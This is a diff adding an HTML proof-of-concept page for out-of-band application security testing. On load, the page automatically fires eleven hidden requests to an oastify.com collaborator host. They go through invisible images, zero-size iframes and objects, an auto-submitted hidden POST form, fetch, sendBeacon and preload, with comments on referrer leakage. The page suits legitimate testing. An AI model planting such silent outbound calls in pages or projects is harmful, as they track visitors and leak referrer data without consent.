@@ -1,0 +1,90 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>OAST Request PoC</title>
+  <!-- Note: no explicit Referrer-Policy so you can observe the browser's default behavior.
+       If you want to force referrer leakage for testing, change to:
+       <meta name="referrer" content="unsafe-url"> -->
+  <style>
+    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 2rem; }
+    .box { width: 200px; height: 120px; border-radius: 12px; margin-top: 12px; display: inline-block; }
+    .bg { background-size: cover; background-position: center; }
+    .small { font-size: 0.9rem; color: #555; }
+    .ok { padding: 0.5rem 0.75rem; border: 1px solid #ddd; border-radius: 8px; display: inline-block; }
+  </style>
+
+  <!-- 1) Stylesheet fetch -->
+  <link rel="stylesheet"
+        href="https://rhcef9wfyhorwvglmjkq9zvk8be22t0hp.oastify.com/style.css?via=link&cb=1" />
+  <!-- 2) Script fetch (will still request even if not valid JS) -->
+  <script src="https://rhcef9wfyhorwvglmjkq9zvk8be22t0hp.oastify.com/script.js?via=script&cb=2" defer></script>
+</head>
+<body>
+  <h1>OAST Request PoC</h1>
+  <p class="small">This page automatically triggers several cross-origin requests to
+    <code>rhcef9wfyhorwvglmjkq9zvk8be22t0hp.oastify.com</code> using different browser primitives.</p>
+
+  <!-- 3) IMG tag -->
+  <p class="ok">IMG request fired.</p>
+  <img src="https://rhcef9wfyhorwvglmjkq9zvk8be22t0hp.oastify.com/pixel.png?via=img&cb=3"
+       alt="" width="1" height="1" style="opacity:0; position:absolute; left:-9999px;" />
+
+  <!-- 4) IFRAME (may be blocked by XFO at server but request still occurs) -->
+  <iframe src="https://rhcef9wfyhorwvglmjkq9zvk8be22t0hp.oastify.com/frame?via=iframe&cb=4"
+          style="width:0;height:0;border:0; position:absolute;"></iframe>
+
+  <!-- 5) CSS background-image fetch -->
+  <div class="box bg"
+       style="background-image:url('https://rhcef9wfyhorwvglmjkq9zvk8be22t0hp.oastify.com/bg.jpg?via=css-bg&cb=5');">
+  </div>
+
+  <!-- 6) OBJECT embed (triggers a GET) -->
+  <object data="https://rhcef9wfyhorwvglmjkq9zvk8be22t0hp.oastify.com/obj?via=object&cb=6"
+          type="text/html" width="0" height="0" style="position:absolute;"></object>
+
+  <!-- Hidden target for auto-submitted form posts so navigation doesn't leave the page -->
+  <iframe name="hiddenSink" style="display:none;"></iframe>
+
+  <form id="postForm"
+        action="https://rhcef9wfyhorwvglmjkq9zvk8be22t0hp.oastify.com/form?via=form-post&cb=7"
+        method="POST" target="hiddenSink" style="display:none;">
+    <input type="hidden" name="poc" value="hello-from-form" />
+  </form>
+
+  <script>
+    (function () {
+      const host = 'rhcef9wfyhorwvglmjkq9zvk8be22t0hp.oastify.com';
+      const t = Date.now();
+
+      // 7) JS-created image (another GET)
+      const i = new Image();
+      i.src = `https://${host}/pixel2.png?via=js-image&cb=${t}`;
+
+      // 8) fetch() opaque GET (no-cors) — request still hits the server
+      fetch(`https://${host}/fetch?via=fetch-nocors&cb=${t}`, { mode: 'no-cors', cache: 'no-store' })
+        .catch(() => { /* ignore */ });
+
+      // 9) sendBeacon POST (fires reliably on page load/unload)
+      if (navigator.sendBeacon) {
+        const data = new Blob([`from=beacon&ts=${t}`], { type: 'application/x-www-form-urlencoded' });
+        navigator.sendBeacon(`https://${host}/beacon?via=beacon&cb=${t}`, data);
+      }
+
+      // 10) Auto-submit POST form to hidden iframe
+      document.getElementById('postForm').submit();
+
+      // 11) Preload hint (still triggers a request)
+      const l = document.createElement('link');
+      l.rel = 'preload';
+      l.as = 'image';
+      l.href = `https://${host}/preload.png?via=preload&cb=${t}`;
+      document.head.appendChild(l);
+    })();
+  </script>
+
+  <p class="small">Tip: To test referrer leakage behaviors, set
+    <code>&lt;meta name="referrer" content="unsafe-url"&gt;</code>
+    or <code>no-referrer</code> as needed.</p>
+</body>
+</html>
